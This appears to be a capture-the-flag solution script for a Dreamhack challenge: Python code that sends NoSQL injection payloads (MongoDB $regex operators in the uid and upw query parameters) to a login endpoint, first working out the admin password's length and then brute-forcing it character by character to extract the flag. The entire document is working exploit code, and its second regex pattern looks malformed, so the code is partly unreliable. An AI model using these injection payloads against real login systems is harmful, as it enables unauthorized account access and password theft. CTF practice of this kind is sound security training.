import requests, string

HOST = 'http://host3.dreamhack.games:13265'
SUCCESS = 'admin'
ALPHANUMERIC = string.digits + string.ascii_letters

i = 1
while True:
    res = requests.get(f'{HOST}/login?uid[$regex]=adm&upw[$regex]=.{{{i}}}')
    if res.text == SUCCESS:
        i += 1
    else:
        i -= 1
        break;
print(f'length of password : {i}')

flag = ''
for k in range(i-4):
    for ch in ALPHANUMERIC:
        res = requests.get(f'{HOST}/login?uid[$regex]=adm&upw[$regex]=D.{{{flag}{ch}')
        if res.text == SUCCESS:
            flag += ch
            break

print(f'flag : DH{{{flag}}}')
